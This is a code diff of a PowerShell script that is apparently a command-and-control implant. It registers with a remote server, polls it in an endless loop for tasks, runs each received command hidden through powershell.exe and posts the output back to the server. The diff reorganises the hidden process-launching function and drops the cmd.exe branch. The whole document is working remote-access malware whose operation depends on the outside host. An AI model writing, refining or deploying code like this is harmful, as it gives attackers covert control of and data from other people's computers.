@@ -15,6 +15,32 @@ $name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POS
 $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
 $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")
 
+function shell($fname, $arg){
+    
+    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
+    $pinfo.FileName               = $fname
+    $pinfo.RedirectStandardError  = $true
+    $pinfo.RedirectStandardOutput = $true
+    $pinfo.UseShellExecute        = $false
+    $pinfo.CreateNoWindow         = $true;
+    $pinfo.Arguments              = $arg
+    $p                            = New-Object System.Diagnostics.Process
+    $p.StartInfo                  = $pinfo
+    
+    $p.Start() | Out-Null
+    $stdout = $p.StandardOutput.ReadToEnd()
+    $stderr = $p.StandardError.ReadToEnd()
+    $p.WaitForExit()
+    
+    if (-Not $stderr) {
+        $res = $stdout
+    } else {
+        $res = "$stdout`n$stderr"
+    }
+
+    $res
+}
+
 for (;;){
     $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
     
@@ -24,17 +50,6 @@ for (;;){
         $args = $task[1..$task.Length]
 
         if ($command -eq "shell") {
-            $f    = "cmd.exe"
-            $arg  = "/c "
-                    
-            foreach ($a in $args){ $arg += $a + " " }
-
-            $res  = shell $f $arg
-            $data = @{result = "$res"}
-                        
-            Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
-
-        } elseif ($command -eq "powershell") {
             $f    = "powershell.exe"
             $arg  = "/c "
                     
@@ -54,31 +69,4 @@ for (;;){
     }
     
     sleep $sleep_time
-}
-
-function shell($fname, $arg){
-    
-    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
-    $pinfo.FileName               = $fname
-    $pinfo.RedirectStandardError  = $true
-    $pinfo.RedirectStandardOutput = $true
-    $pinfo.UseShellExecute        = $false
-    $pinfo.CreateNoWindow         = $true;
-    $pinfo.Arguments              = $arg
-    $p                            = New-Object System.Diagnostics.Process
-    $p.StartInfo                  = $pinfo
-    
-    $p.Start() | Out-Null
-    $p.WaitForExit()
-    
-    $stdout = $p.StandardOutput.ReadToEnd()
-    $stderr = $p.StandardError.ReadToEnd()
-
-    if (-Not $stderr) {
-        $res = $stdout
-    } else {
-        $res = "$stdout`n$stderr"
-    }
-
-    $res
 }
